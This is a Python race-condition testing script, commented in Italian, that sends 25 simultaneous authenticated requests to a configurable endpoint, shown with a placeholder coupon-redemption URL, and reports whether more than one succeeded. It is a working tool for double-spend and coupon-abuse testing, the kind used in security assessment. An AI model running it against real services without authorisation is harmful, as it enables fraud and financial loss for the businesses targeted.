#!/usr/bin/env python3
"""
apinator — Race Condition Tester
==================================
Invia N richieste concorrenti verso un endpoint per testare
race condition (TOCTOU, double-spend, coupon abuse, ecc.).

Dipendenze:
    pip3 install aiohttp --break-system-packages

Usage:
    python3 race_condition.py
"""

import asyncio
import aiohttp
import json
import time

# ── CONFIG ───────────────────────────────────────────────────────────────────

TARGET_URL   = "https://target.com/api/v1/coupon/redeem"
TOKEN        = "Bearer YOUR_TOKEN_HERE"
METHOD       = "POST"                        # GET, POST, PUT, PATCH
PAYLOAD      = {"coupon_code": "DISCOUNT50"} # body JSON
CONCURRENCY  = 25                            # richieste parallele
TIMEOUT      = 15

HEADERS = {
    "Authorization": TOKEN,
    "Content-Type": "application/json",
}

# ── CORE ──────────────────────────────────────────────────────────────────────

results = []

async def send_request(session: aiohttp.ClientSession, idx: int) -> dict:
    """Invia una singola richiesta e raccoglie il risultato."""
    start = time.monotonic()
    try:
        method = getattr(session, METHOD.lower())
        kwargs = {"headers": HEADERS, "timeout": aiohttp.ClientTimeout(total=TIMEOUT)}
        if METHOD in ("POST", "PUT", "PATCH"):
            kwargs["json"] = PAYLOAD

        async with method(TARGET_URL, **kwargs) as resp:
            body = await resp.text()
            elapsed = time.monotonic() - start
            result = {
                "id": idx,
                "status": resp.status,
                "elapsed_ms": round(elapsed * 1000),
                "body_preview": body[:200],
            }
    except Exception as e:
        result = {"id": idx, "status": "ERROR", "error": str(e), "elapsed_ms": -1}

    results.append(result)
    status_icon = "✅" if result["status"] == 200 else "❌"
    print(f"  [{idx:02d}] {status_icon} HTTP {result['status']} — {result['elapsed_ms']}ms")
    return result


async def main():
    print("=" * 60)
    print("  apinator — Race Condition Tester")
    print("=" * 60)
    print(f"  Target      : {TARGET_URL}")
    print(f"  Method      : {METHOD}")
    print(f"  Payload     : {json.dumps(PAYLOAD)}")
    print(f"  Concurrency : {CONCURRENCY} richieste parallele")
    print()
    print(f"[*] Firing {CONCURRENCY} requests simultaneously...")
    print()

    connector = aiohttp.TCPConnector(limit=CONCURRENCY)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [send_request(session, i) for i in range(CONCURRENCY)]
        await asyncio.gather(*tasks)

    # ── Analisi risultati ────────────────────────────────────────────
    print()
    print("=" * 60)
    print("  ANALISI")
    print("=" * 60)

    success   = [r for r in results if r.get("status") == 200]
    errors    = [r for r in results if r.get("status") == "ERROR"]
    other     = [r for r in results if r.get("status") not in (200, "ERROR")]

    print(f"  ✅ 200 OK  : {len(success)}")
    print(f"  ❌ Errors  : {len(errors)}")
    print(f"  ⚠️  Other   : {len(other)}")

    if len(success) > 1:
        print()
        print("  🔴 RACE CONDITION RILEVATA!")
        print(f"     {len(success)} richieste hanno ricevuto 200 OK — l'operazione")
        print("     è stata eseguita più volte. Verifica manuale consigliata.")
    elif len(success) == 1:
        print()
        print("  ✅ Solo una richiesta ha avuto successo — comportamento corretto.")
    else:
        print()
        print("  ℹ️  Nessun 200 ricevuto — endpoint potrebbe essere protetto o down.")

    # Salva output completo
    with open("race_results.json", "w") as f:
        json.dump(sorted(results, key=lambda x: x["id"]), f, indent=2)
    print()
    print("  Output completo salvato in: race_results.json")


if __name__ == "__main__":
    asyncio.run(main())
